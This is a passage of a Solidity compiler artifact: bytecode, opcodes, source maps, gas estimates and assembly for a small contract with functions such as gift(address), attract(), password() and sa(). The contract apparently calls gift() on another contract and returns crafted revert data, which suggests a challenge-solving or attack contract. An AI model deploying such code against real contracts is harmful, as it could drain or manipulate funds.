SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x176 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x15B JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x1A3 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1BD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1C6 PUSH2 0x43D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x214 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x21D PUSH2 0x462 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x27D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x2B2 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x491 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xCBFC4BCE ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x377 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x38B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x40CAAE0600000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH4 0x40CAAE06 PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL SWAP2 POP PUSH2 0x2022 PUSH1 0x1 MUL SWAP1 POP DUP2 PUSH1 0x0 MSTORE DUP1 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 CALLDATALOAD 0xaa 0xbf SWAP12 0x29 0x22 0xf8 0xc9 BALANCE 0xf6 DUP12 SWAP11 0x4e COINBASE SHL PUSH11 0x8F3ABFAD87C4644D256F35 EXP SHR 0xb9 PUSH28 0x86002900000000000000000000000000000000000000000000000000 ",
							"sourceMap": "59:590:0:-;;;250:18;;;230:38;;;;;;;;;;;;;;;;;;;;;275:58;8:9:-1;5:2;;;30:1;27;20:12;5:2;275:58:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;321:4;316:2;;:9;;;;;;;;;;;;;;;;;;275:58;59:590;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063224b610b1461008857806350f35753146100b357806377bd73db146100ca5780637867fdea146101215780638da5cb5b146101b1578063b8e010de14610208578063cbfc4bce14610271575b600080fd5b34801561009457600080fd5b5061009d6102b4565b6040518082815260200191505060405180910390f35b3480156100bf57600080fd5b506100c86102ba565b005b3480156100d657600080fd5b506100df610391565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561012d57600080fd5b506101366103b7565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561017657808201518184015260208101905061015b565b50505050905090810190601f1680156101a35780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156101bd57600080fd5b506101c661043d565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561021457600080fd5b5061021d610462565b60405180827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19167bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916815260200191505060405180910390f35b34801561027d57600080fd5b506102b2600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610491565b005b60015481565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663cbfc4bce306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561037757600080fd5b505af115801561038b573d6000803e3d6000fd5b50505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6040516024016040516020818303038152906040527f40caae06000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505081565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600260149054906101000a90047c01000000000000000000000000000000000000000000000000000000000281565b6000806340caae067c01000000000000000000000000000000000000000000000000000000000291506120226001029050816000528060045260246000fd00a165627a7a7230582035aabf9b2922f8c931f68b9a4e411b6a8f3abfad87c4644d256f350a1cb97b860029",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x83 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x224B610B EQ PUSH2 0x88 JUMPI DUP1 PUSH4 0x50F35753 EQ PUSH2 0xB3 JUMPI DUP1 PUSH4 0x77BD73DB EQ PUSH2 0xCA JUMPI DUP1 PUSH4 0x7867FDEA EQ PUSH2 0x121 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x1B1 JUMPI DUP1 PUSH4 0xB8E010DE EQ PUSH2 0x208 JUMPI DUP1 PUSH4 0xCBFC4BCE EQ PUSH2 0x271 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x94 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x9D PUSH2 0x2B4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xBF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xC8 PUSH2 0x2BA JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xD6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xDF PUSH2 0x391 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x12D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x136 PUSH2 0x3B7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x176 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x15B JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x1A3 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1BD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1C6 PUSH2 0x43D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x214 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x21D PUSH2 0x462 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x27D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x2B2 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x491 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xCBFC4BCE ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x377 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x38B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x40CAAE0600000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH4 0x40CAAE06 PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL SWAP2 POP PUSH2 0x2022 PUSH1 0x1 MUL SWAP1 POP DUP2 PUSH1 0x0 MSTORE DUP1 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 CALLDATALOAD 0xaa 0xbf SWAP12 0x29 0x22 0xf8 0xc9 BALANCE 0xf6 DUP12 SWAP11 0x4e COINBASE SHL PUSH11 0x8F3ABFAD87C4644D256F35 EXP SHR 0xb9 PUSH28 0x86002900000000000000000000000000000000000000000000000000 ",
							"sourceMap": "59:590:0:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;106:24;;8:9:-1;5:2;;;30:1;27;20:12;5:2;106:24:0;;;;;;;;;;;;;;;;;;;;;;;577:67;;8:9:-1;5:2;;;30:1;27;20:12;5:2;577:67:0;;;;;;137:14;;8:9:-1;5:2;;;30:1;27;20:12;5:2;137:14:0;;;;;;;;;;;;;;;;;;;;;;;;;;;158:65;;8:9:-1;5:2;;;30:1;27;20:12;5:2;158:65:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;158:65:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;78:21;;8:9:-1;5:2;;;30:1;27;20:12;5:2;78:21:0;;;;;;;;;;;;;;;;;;;;;;;;;;;230:38;;8:9:-1;5:2;;;30:1;27;20:12;5:2;230:38:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;339:232;;8:9:-1;5:2;;;30:1;27;20:12;5:2;339:232:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;106:24;;;;:::o;577:67::-;614:2;;;;;;;;;;;:7;;;630:4;614:22;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;614:22:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;614:22:0;;;;577:67::o;137:14::-;;;;;;;;;;;;;:::o;158:65::-;186:37;;;;;;49:4:-1;39:7;30;26:21;22:32;13:7;6:49;186:37:0;;;;;;;38:4:-1;29:7;25:18;67:10;61:17;96:58;199:8;192:4;186;182:15;179:29;167:10;160:49;0:215;;;186:37:0;158:65;:::o;78:21::-;;;;;;;;;;;;;:::o;230:38::-;;;;;;;;;;;;;:::o;339:232::-;383:10;416:11;395:10;383:22;;;;438:6;430:15;;416:29;;490:3;487:1;480:14;520:3;515;508:16;548:4;545:1;538:15"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "255200",
								"executionCost": "40977",
								"totalCost": "296177"
							},
							"external": {
								"SEL()": "infinite",
								"attract()": "infinite",
								"gift(address)": "380",
								"owner()": "530",
								"password()": "394",
								"sa()": "486",
								"set()": "610"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 59,
									"end": 649,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 59,
									"end": 649,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 59,
									"end": 649,
									"name": "MSTORE"
								},
								{
									"begin": 250,
									"end": 268,
									"name": "PUSH",
									"value": "CBFC4BCE"
								},
								{
									"begin": 250,
									"end": 268,
									"name": "PUSH",
									"value": "100000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 250,
									"end": 268,
									"name": "MUL"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "PUSH",
									"value": "2"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "PUSH",
									"value": "14"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "PUSH",
									"value": "100"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "EXP"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "DUP2"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "SLOAD"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "DUP2"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "PUSH",
									"value": "FFFFFFFF"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "MUL"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "NOT"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "AND"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "SWAP1"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "DUP4"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "PUSH",
									"value": "100000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "SWAP1"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "DIV"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "MUL"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "OR"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "SWAP1"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "SSTORE"
								},
								{
									"begin": 230,
									"end": 268,
									"name": "POP"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "CALLVALUE"
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "POP"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "MLOAD"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "DUP1"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "PUSHSIZE"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "DUP4"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "CODECOPY"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "DUP2"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "ADD"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "DUP1"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "MSTORE"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "DUP2"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "ADD"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "SWAP1"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "DUP1"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "DUP1"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "MLOAD"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "SWAP1"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "ADD"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "SWAP1"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "SWAP3"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "SWAP2"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "SWAP1"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "POP"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "POP"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "POP"
								},
								{
									"begin": 321,
									"end": 325,
									"name": "DUP1"
								},
								{
									"begin": 316,
									"end": 318,
									"name": "PUSH",
									"value": "2"
								},
								{
									"begin": 316,
									"end": 318,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "PUSH",
									"value": "100"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "EXP"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "DUP2"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "SLOAD"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "DUP2"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "MUL"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "NOT"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "AND"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "SWAP1"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "DUP4"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "AND"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "MUL"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "OR"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "SWAP1"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "SSTORE"
								},
								{
									"begin": 316,
									"end": 325,
									"name": "POP"
								},
								{
									"begin": 275,
									"end": 333,
									"name": "POP"
								},
								{
									"begin": 59,
									"end": 649,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 59,
									"end": 649,
									"name": "DUP1"
								},
								{
									"begin": 59,
									"end": 649,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 59,
									"end": 649,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 59,
									"end": 649,
									"name": "CODECOPY"
								},
								{
									"begin": 59,
									"end": 649,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 59,
									"end": 649,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a165627a7a7230582035aabf9b2922f8c931f68b9a4e411b6a8f3abfad87c4644d256f350a1cb97b860029",
									".code": [
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "MSTORE"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "LT"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "JUMPI"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "SWAP1"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "DIV"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "AND"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "DUP1"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH",
											"value": "224B610B"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "EQ"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "JUMPI"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "DUP1"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH",
											"value": "50F35753"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "EQ"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "JUMPI"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "DUP1"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH",
											"value": "77BD73DB"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "EQ"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "JUMPI"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "DUP1"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH",
											"value": "7867FDEA"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "EQ"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "JUMPI"
										},
										{
											"begin": 59,
											"end": 649,
